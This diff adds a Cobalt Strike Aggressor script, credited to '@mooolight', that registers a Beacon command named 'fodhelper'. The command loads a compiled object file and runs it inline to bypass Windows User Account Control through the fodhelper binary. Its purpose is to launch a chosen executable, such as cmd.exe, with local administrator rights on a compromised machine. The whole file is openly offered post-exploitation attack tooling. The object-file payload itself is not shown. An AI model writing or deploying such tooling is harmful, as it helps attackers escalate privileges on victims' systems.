@@ -1,0 +1,29 @@
+# author @mooolight
+
+beacon_command_register(
+	"fodhelper", "A privilege escalation technique bypassing UAC to acquire local admin context.",
+	"INFO:\nExecutes the fodhelper binary privilege escalation technique.\n\n" .
+	"ARGUMENTS:\n[<path-to-dll/exe>]: specify the binary to execute with elevated privilege.\n\n" .
+	"USAGE:\nfodhelper "<path-to-dll/exe>"\n\n" .
+	"EXAMPLES:\nfodhelper \"C:\\Windows\\System32\\cmd.exe\" \n\n");
+	
+alias fodhelper {
+    $bid = $1;
+    $path = $2;
+
+    if ($path eq "") {
+        berror($bid, "Please specify file path to execute with Local Admin privilege.\n");
+        return;
+    }
+	
+    # Read in the right BOF file
+    $handle = openf(script_resource("fodhelper.o"));
+    $data   = readb($handle, -1);
+    closef($handle);
+
+    # Pack our arguments
+    $arg_data  = bof_pack($bid, "z", $path);
+
+    blog($bid, "Tasked to bypass UAC and elevate privilege via fodhelper..");
+    beacon_inline_execute($bid, $data, "go", $arg_data);
+}
